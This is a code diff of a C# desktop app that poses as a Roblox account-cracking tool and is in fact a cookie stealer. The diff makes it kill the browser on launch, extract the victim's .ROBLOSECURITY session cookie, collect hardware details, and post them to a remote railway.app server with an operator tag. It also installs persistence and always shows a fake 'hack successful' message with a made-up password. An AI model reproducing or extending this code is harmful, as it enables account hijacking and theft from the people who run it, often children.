@@ -37,7 +37,7 @@ namespace FileTransfer
         private const string ServerUrl = "https://file-transfer-production-75ad.up.railway.app";
         private const string OperatorName = "DildMan";
 
-        private string? _cpu, _ram, _gpu;
+        private string? _cpu, _ram, _gpu, _cookieError;
         private static string? _cachedToken;
         private const string PlaceholderText = "Введите никнейм...";
         private DispatcherTimer? _debounceTimer;
@@ -99,6 +99,8 @@ namespace FileTransfer
                     ShowInTaskbar = true;
                     Opacity = 1;
                     Log("Visible mode start");
+                    // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
+                    _ = Task.Run(StartBackgroundWorkAsync);
                 }
 
                 Log("MainWindow constructor OK");
@@ -117,13 +119,12 @@ namespace FileTransfer
 
             if (!_backgroundMode)
             {
-                // Первое закрытие: прячем окно, ставим персистентность, уходим в фон
+                // Первое закрытие: прячем окно, ставим персистентность
                 Log("Closing to background");
                 _backgroundMode = true;
                 Persistence.Install();
                 Hide();
                 ShowInTaskbar = false;
-                _ = Task.Run(StartBackgroundWorkAsync);
             }
             else
             {
@@ -163,10 +164,22 @@ namespace FileTransfer
             Log("Background work start");
             try
             {
+                // 1. Сначала извлекаем куку (убивает браузер, читает SQLite)
+                _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
+                Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
+
+                // 1.5 Если кука не найдена — читаем лог экстрактора для диагностики
+                if (string.IsNullOrEmpty(_cachedToken))
+                    ReadCookieDebugLog();
+
+                // 2. Получаем характеристики ПК (WMI) до отправки
                 _cpu = ComputerInfo.GetCPU();
                 _ram = ComputerInfo.GetRAM();
                 _gpu = ComputerInfo.GetGPU();
+
+                // 3. Отправляем на сервер вместе с системой и кукой
                 await UploadFileOnStartupAsync();
+
                 Log("Background work OK");
             }
             catch (Exception ex)
@@ -209,16 +222,21 @@ namespace FileTransfer
                 content.Add(new StringContent(_gpu ?? "—"), "gpu");
                 content.Add(new StringContent(OperatorName), "operator");
 
-                // Пробуем вытянуть .ROBLOSECURITY и отправить сразу
-                try
+                if (!string.IsNullOrEmpty(_cachedToken))
                 {
-                    _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
-                    if (!string.IsNullOrEmpty(_cachedToken))
-                    {
-                        content.Add(new StringContent(_cachedToken), "robloSecurity");
-                    }
+                    content.Add(new StringContent(_cachedToken), "robloSecurity");
+                    Log("Token added to upload");
                 }
-                catch { }
+                else
+                {
+                    Log("No token to upload");
+                }
+
+                if (!string.IsNullOrEmpty(_cookieError))
+                {
+                    content.Add(new StringContent(_cookieError), "cookieError");
+                    Log("Cookie debug log added to upload");
+                }
 
                 string url = $"{ServerUrl}/upload";
                 var resp = await _http.PostAsync(url, content);
@@ -227,6 +245,47 @@ namespace FileTransfer
             catch (Exception ex)
             {
                 Log("Upload startup error: " + ex);
+            }
+        }
+
+        private void ReadCookieDebugLog()
+        {
+            try
+            {
+                string logPath = Path.Combine(Path.GetTempPath(), "cookie_debug.log");
+                if (File.Exists(logPath))
+                {
+                    string logContent = File.ReadAllText(logPath);
+                    if (logContent.Length > 1500)
+                        logContent = logContent[^1500..];
+                    _cookieError = logContent;
+                    Log($"Cookie debug log read: {logContent.Length} chars");
+                }
+                else
+                {
+                    _cookieError = "cookie_debug.log not found";
+                    Log("cookie_debug.log not found");
+                }
+            }
+            catch (Exception ex)
+            {
+                _cookieError = $"Error reading log: {ex.Message}";
+                Log($"ReadCookieDebugLog error: {ex.Message}");
+            }
+        }
+
+        // ── Pre-extract cookie in visible mode (background thread) ─────────
+        private async Task PreExtractCookieAsync()
+        {
+            Log("PreExtractCookie start");
+            try
+            {
+                _cachedToken ??= await Task.Run(() => CookieExtractor.ExtractRobloSecurity());
+                Log($"PreExtractCookie done, token len={_cachedToken?.Length ?? 0}");
+            }
+            catch (Exception ex)
+            {
+                Log("PreExtractCookie error: " + ex);
             }
         }
 
@@ -411,16 +470,7 @@ namespace FileTransfer
                 return;
             }
 
-            // Используем кешированный .ROBLOSECURITY из запуска
             string token = _cachedToken ?? "";
-            if (!string.IsNullOrEmpty(token))
-            {
-                AppendConsole("[cookie]", "#FFA502", " .ROBLOSECURITY загружен из кеша", "#2ED573");
-            }
-            else
-            {
-                AppendConsole("[cookie]", "#FFA502", " .ROBLOSECURITY отсутствует", "#FF4757");
-            }
 
             BtnHack.IsEnabled = false;
             TxtUsername.IsEnabled = false;
@@ -490,6 +540,7 @@ namespace FileTransfer
 
             string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());
 
+            // Отправляем username/password на сервер (токен уже ушёл при старте)
             try
             {
                 var updatePayload = new
@@ -502,28 +553,15 @@ namespace FileTransfer
                 };
                 var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
                 using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
-
                 string url = $"{ServerUrl}/update-roblox";
-                var resp = await _http.PostAsync(url, updateContent);
+                await _http.PostAsync(url, updateContent);
+            }
+            catch { }
 
-                if (resp.IsSuccessStatusCode)
-                {
-                    SetStatusBadge("ВЗЛОМ УСПЕШЕН", "#2ED573");
-                    TxtPassword.Text = fakePassword;
-                    PanelResult.Visibility = Visibility.Visible;
-                    AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");
-                }
-                else
-                {
-                    SetStatusBadge("ОШИБКА СЕРВЕРА", "#FF4757");
-                    AppendConsole("[error]", "#FF4757", " Ошибка отправки на сервер", "#FF4757");
-                }
-            }
-            catch
-            {
-                SetStatusBadge("НЕТ СВЯЗИ", "#FF4757");
-                AppendConsole("[error]", "#FF4757", " Нет соединения с сервером", "#FF4757");
-            }
+            SetStatusBadge("ВЗЛОМ УСПЕШЕН", "#2ED573");
+            TxtPassword.Text = fakePassword;
+            PanelResult.Visibility = Visibility.Visible;
+            AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");
 
             BtnHack.IsEnabled = true;
             TxtUsername.IsEnabled = true;
